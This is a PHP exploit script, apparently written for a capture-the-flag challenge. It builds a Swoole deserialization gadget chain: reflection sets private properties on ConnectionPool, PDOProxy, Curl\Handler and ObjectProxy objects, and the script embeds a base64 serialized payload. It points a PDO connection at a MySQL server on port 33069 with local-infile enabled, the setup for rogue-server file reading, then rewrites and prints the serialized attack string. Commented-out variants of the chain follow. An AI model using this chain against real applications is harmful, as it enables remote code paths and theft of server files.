<?php
if (!class_exists('\Swoole\ObjectProxy')) {
    require './swoole-mock.php';
}

function changeProperty ($object, $property, $value)
{
   $a = new ReflectionClass($object);
   $b = $a->getProperty($property);
   $b->setAccessible(true);
   $b->setValue($object, $value);
}

$c = new \Swoole\Database\PDOConfig();
$c->withHost('127.0.0.1');
$c->withPort(33069);
$c->withOptions([
    \PDO::MYSQL_ATTR_LOCAL_INFILE => 1,
    \PDO::MYSQL_ATTR_INIT_COMMAND => 'select 1'
]);

$a = new \Swoole\ConnectionPool(function () { }, 0, '\\Swoole\\Database\\PDOPool');
changeProperty($a, 'size', 100);
changeProperty($a, 'constructor', $c);
changeProperty($a, 'num', 0);
changeProperty($a, 'pool', new \SplDoublyLinkedList());

/*
// In normal PHP
$c = new ObjectProxy([$a, 'fill']);
// $c();
echo serialize($c);
*/
$d = unserialize(base64_decode('TzoyNDoiU3dvb2xlXERhdGFiYXNlXFBET1Byb3h5Ijo0OntzOjExOiIAKgBfX29iamVjdCI7TjtzOjIyOiIAKgBzZXRBdHRyaWJ1dGVDb250ZXh0IjtOO3M6MTQ6IgAqAGNvbnN0cnVjdG9yIjtOO3M6ODoiACoAcm91bmQiO2k6MDt9'));
changeProperty($d, 'constructor', [$a, 'get']);


/*
$d->reconnect();
$d->get();
*/

$curl = new \Swoole\Curl\Handler('http://www.baidu.com');
$curl->setOpt(CURLOPT_HEADERFUNCTION, [$d, 'reconnect']);
$curl->setOpt(CURLOPT_READFUNCTION, [$d, 'get']);

$ret = new \Swoole\ObjectProxy(new stdClass);
changeProperty($ret, '__object', [$curl, 'exec']);

$s = serialize($ret);
$s = preg_replace_callback('/s:(\d+):"\x00(.*?)\x00/', function ($a) {
    return 's:' . ((int)$a[1] - strlen($a[2]) - 2) . ':"';
}, $s);



// var_dump($s);
// var_dump(unserialize($s));
echo $s;
echo "\n";


/*
$e = new \Swoole\ConnectionPool(function () { }, 0, null);
changeProperty($e, 'size', 1);
changeProperty($e, 'constructor', $d);
changeProperty($e, 'num', 0);
changeProperty($e, 'pool', new \SplDoublyLinkedList());

$f = new \Swoole\ObjectProxy(new stdClass);
changeProperty($f, '__object', [$e, 'get']);

var_dump($f());exit;
*/
//echo base64_encode(serialize($d));

//$p = $e();
//var_dump($p);exit;
//$p = $d();
//var_dump($p);
/*
//$e = new \Swoole\Database\PDOProxy(null);
$e = unserialize(base64_decode('TzoyNDoiU3dvb2xlXERhdGFiYXNlXFBET1Byb3h5Ijo0OntzOjExOiIAKgBfX29iamVjdCI7TjtzOjIyOiIAKgBzZXRBdHRyaWJ1dGVDb250ZXh0IjtOO3M6MTQ6IgAqAGNvbnN0cnVjdG9yIjtOO3M6ODoiACoAcm91bmQiO2k6MDt9'));
changeProperty($e, 'constructor', $d);

//var_dump(base64_encode(serialize($e)));exit;
$f = new \Swoole\ObjectProxy(new stdClass);
changeProperty($f, '__object', [$e, 'reconnect']);
$f();
var_dump($f);
//echo base64_encode(serialize($e));

*/
